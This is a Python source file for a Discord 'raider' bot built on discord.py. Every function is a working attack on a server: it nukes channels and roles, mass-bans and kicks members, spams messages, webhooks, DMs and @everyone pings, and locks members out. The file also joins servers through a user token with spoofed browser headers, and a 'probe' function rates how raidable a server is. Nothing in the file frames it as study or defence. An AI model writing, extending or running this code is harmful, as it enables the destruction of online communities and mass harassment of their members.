# language: Python, file: raider.py, target: discord.py 2.x
# all raid workers — called from bot.py commands

import asyncio
import discord
import aiohttp

# ── nuke: delete all channels, recreate spammed ones ──────────────────────────
async def nuke_guild(guild: discord.Guild, spam_name: str = "nuked", count: int = 50):
    tasks = [ch.delete() for ch in guild.channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    creates = [guild.create_text_channel(spam_name) for _ in range(min(count, 500))]
    await asyncio.gather(*creates, return_exceptions=True)

# ── channel spam ───────────────────────────────────────────────────────────────
async def spam_channels(guild: discord.Guild, message: str, times: int = 50, delay: float = 0.0):
    async def blast(channel):
        for _ in range(times):
            try:
                await channel.send(message)
                if delay:
                    await asyncio.sleep(delay)
            except Exception:
                break
    await asyncio.gather(*[blast(ch) for ch in guild.text_channels], return_exceptions=True)

# ── dm all members ─────────────────────────────────────────────────────────────
async def dm_members(guild: discord.Guild, message: str, limit: int = 0) -> int:
    count = 0
    async for member in guild.fetch_members(limit=None):
        if member.bot:
            continue
        try:
            await member.send(message)
            count += 1
            if limit and count >= limit:
                break
        except Exception:
            continue
    return count

# ── delete all roles ───────────────────────────────────────────────────────────
async def delete_roles(guild: discord.Guild):
    tasks = []
    for role in guild.roles:
        if not role.is_default() and role.position < guild.me.top_role.position:
            tasks.append(role.delete())
    await asyncio.gather(*tasks, return_exceptions=True)

# ── ban all members ────────────────────────────────────────────────────────────
async def ban_all(guild: discord.Guild, reason: str = "raid"):
    async for member in guild.fetch_members(limit=None):
        if member == guild.me or member == guild.owner:
            continue
        try:
            await guild.ban(member, reason=reason, delete_message_days=0)
        except Exception:
            continue

# ── kick all members ───────────────────────────────────────────────────────────
async def kick_all(guild: discord.Guild, reason: str = "raid"):
    async for member in guild.fetch_members(limit=None):
        if member == guild.me or member == guild.owner:
            continue
        try:
            await guild.kick(member, reason=reason)
        except Exception:
            continue

# ── webhook spam ───────────────────────────────────────────────────────────────
async def webhook_spam(guild: discord.Guild, message: str, times: int = 30, name: str = "raid"):
    async def fire(channel):
        try:
            wh = await channel.create_webhook(name=name)
            async with aiohttp.ClientSession() as session:
                for _ in range(times):
                    try:
                        await session.post(wh.url, json={"content": message, "username": name})
                    except Exception:
                        break
            await wh.delete()
        except Exception:
            pass
    await asyncio.gather(*[fire(ch) for ch in guild.text_channels], return_exceptions=True)

# ── rename guild ───────────────────────────────────────────────────────────────
async def rename_guild(guild: discord.Guild, name: str):
    try:
        await guild.edit(name=name)
    except Exception:
        pass

# ── rename all channels ────────────────────────────────────────────────────────
async def rename_channels(guild: discord.Guild, name: str):
    tasks = [ch.edit(name=name) for ch in guild.channels]
    await asyncio.gather(*tasks, return_exceptions=True)

# ── vc disconnect all ──────────────────────────────────────────────────────────
async def vc_kick_all(guild: discord.Guild):
    tasks = []
    for member in guild.members:
        if member.voice and member.voice.channel:
            tasks.append(member.move_to(None))
    await asyncio.gather(*tasks, return_exceptions=True)

# ── @everyone / @here spam ─────────────────────────────────────────────────────
async def mention_spam(guild: discord.Guild, times: int = 20):
    async def blast(ch):
        for _ in range(times):
            try:
                await ch.send("@everyone")
            except Exception:
                break
    await asyncio.gather(*[blast(ch) for ch in guild.text_channels], return_exceptions=True)

# ── delete all emojis ──────────────────────────────────────────────────────────
async def delete_emojis(guild: discord.Guild) -> int:
    count = 0
    tasks = []
    for emoji in guild.emojis:
        tasks.append(emoji.delete())
        count += 1
    await asyncio.gather(*tasks, return_exceptions=True)
    return count

# ── delete all webhooks ────────────────────────────────────────────────────────
async def delete_webhooks(guild: discord.Guild) -> int:
    count = 0
    try:
        webhooks = await guild.webhooks()
        tasks = [wh.delete() for wh in webhooks]
        count = len(tasks)
        await asyncio.gather(*tasks, return_exceptions=True)
    except Exception:
        pass
    return count

# ── create role + assign to all members ───────────────────────────────────────
async def role_all(guild: discord.Guild, role_name: str = "raided") -> int:
    count = 0
    try:
        role = await guild.create_role(name=role_name, mentionable=True)
        async for member in guild.fetch_members(limit=None):
            if member.bot:
                continue
            try:
                await member.add_roles(role)
                count += 1
            except Exception:
                continue
    except Exception:
        pass
    return count

# ── crash vc: rapid create/delete vc channels ──────────────────────────────────
async def crash_vc(guild: discord.Guild, cycles: int = 20):
    for _ in range(cycles):
        try:
            vc = await guild.create_voice_channel("vc-crash")
            await asyncio.sleep(0.1)
            await vc.delete()
        except Exception:
            pass

# ── lockdown: deny @everyone send/view in all channels ────────────────────────
async def lockdown_channels(guild: discord.Guild) -> int:
    count = 0
    everyone = guild.default_role
    overwrite = discord.PermissionOverwrite(
        send_messages=False,
        read_messages=False,
        add_reactions=False,
    )
    for channel in guild.channels:
        try:
            await channel.set_permissions(everyone, overwrite=overwrite)
            count += 1
        except Exception:
            continue
    return count

# ── join server via user token ─────────────────────────────────────────────────
# uses Discord API directly — POST /invites/{code} with user Authorization header
async def join_server(invite_code: str, user_token: str) -> str:
    url     = f"https://discord.com/api/v10/invites/{invite_code}"
    headers = {
        "Authorization":  user_token,
        "Content-Type":   "application/json",
        "User-Agent":     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIn0=",
    }
    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, json={}) as resp:
            if resp.status in (200, 204):
                data = await resp.json()
                guild_name = data.get("guild", {}).get("name", "unknown")
                return f"✅ joined `{guild_name}`"
            elif resp.status == 401:
                return "❌ invalid user token"
            elif resp.status == 403:
                return "❌ forbidden (banned / verification required)"
            elif resp.status == 404:
                return "❌ invite not found / expired"
            elif resp.status == 429:
                return "❌ rate limited"
            else:
                return f"❌ status {resp.status}"

# ── probe: raidability audit ───────────────────────────────────────────────────
# checks bot permissions + guild security settings + external app restrictions
async def probe_guild(guild: discord.Guild) -> str:
    me = guild.me
    gp = me.guild_permissions

    # permission checks
    has_admin    = gp.administrator
    can_nuke     = gp.manage_channels and gp.manage_roles
    can_ban      = gp.ban_members
    can_kick     = gp.kick_members
    can_webhook  = gp.manage_webhooks
    can_mention  = gp.mention_everyone
    can_msg      = gp.send_messages
    can_emoji    = gp.manage_emojis
    can_voice    = gp.move_members

    # guild security settings
    mfa_required   = guild.mfa_level == discord.MFALevel.require_2fa
    verif_level    = str(guild.verification_level)
    is_community   = "COMMUNITY" in guild.features
    # external apps / use_external_apps permission on @everyone
    everyone       = guild.default_role
    ext_apps_blocked = not everyone.permissions.use_application_commands
    # check if bot can use external emoji
    can_ext_emoji = gp.use_external_emojis

    # raidability score (rough)
    raid_perms = [has_admin or (can_nuke and can_ban and can_kick and can_msg)]
    raidable   = "✅ RAIDABLE" if raid_perms[0] else "⚠️ LIMITED"

    lines = [
        f"**probe: {guild.name}** (`{guild.id}`)",
        f"members : {guild.member_count}",
        f"owner   : {guild.owner}",
        "",
        "**bot permissions**",
        f"administrator      : {'✅' if has_admin else '❌'}",
        f"manage_channels    : {'✅' if gp.manage_channels else '❌'}",
        f"manage_roles       : {'✅' if gp.manage_roles else '❌'}",
        f"ban_members        : {'✅' if can_ban else '❌'}",
        f"kick_members       : {'✅' if can_kick else '❌'}",
        f"manage_webhooks    : {'✅' if can_webhook else '❌'}",
        f"mention_everyone   : {'✅' if can_mention else '❌'}",
        f"send_messages      : {'✅' if can_msg else '❌'}",
        f"manage_emojis      : {'✅' if can_emoji else '❌'}",
        f"move_members       : {'✅' if can_voice else '❌'}",
        "",
        "**server security**",
        f"MFA required       : {'🔒 yes (moderator actions need 2FA on your account)' if mfa_required else '✅ no'}",
        f"verification level : {verif_level}",
        f"community server   : {'⚠️ yes (extra restrictions)' if is_community else '✅ no'}",
        f"ext. app cmds block: {'⚠️ yes (@everyone blocked)' if ext_apps_blocked else '✅ no'}",
        "",
        f"**verdict: {raidable}**",
    ]

    if not raid_perms[0]:
        missing = []
        if not gp.manage_channels: missing.append("manage_channels")
        if not gp.ban_members:     missing.append("ban_members")
        if not gp.kick_members:    missing.append("kick_members")
        if not gp.send_messages:   missing.append("send_messages")
        lines.append(f"missing: {', '.join(missing)}")
        lines.append("bot needs re-invite with higher perms or admin role assigned")

    return "\n".join(lines)
